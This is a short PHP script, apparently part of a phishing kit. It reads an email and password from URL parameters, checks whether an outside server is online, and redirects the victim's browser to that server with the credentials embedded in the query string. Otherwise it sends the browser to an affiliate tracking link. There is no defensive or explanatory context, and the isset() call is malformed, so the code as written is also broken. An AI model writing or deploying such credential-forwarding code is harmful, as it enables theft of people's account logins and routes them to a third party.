<?php 
if(isset($_GET['email'] && $_GET['pass'] )){

$usuario = $_GET['email'];
$password = $_GET['pass'];
// API SERVER
$estadisticasAPI = json_decode( file_get_contents('http://server1.3utilities.com/api-server.php'), true );
$estado = $estadisticasAPI['estado'];

if($estado == 'online'){

 header ("Location: http://server1.3utilities.com/chelin/login.php?usuario=".$usuario."&password=".$password."");

}else{

  header ("Location: https://Tracking-all-traffic.offerdirecto.com?id=LGoRTd6m85&type=21&click_id={click_id}");
}

}


 ?>
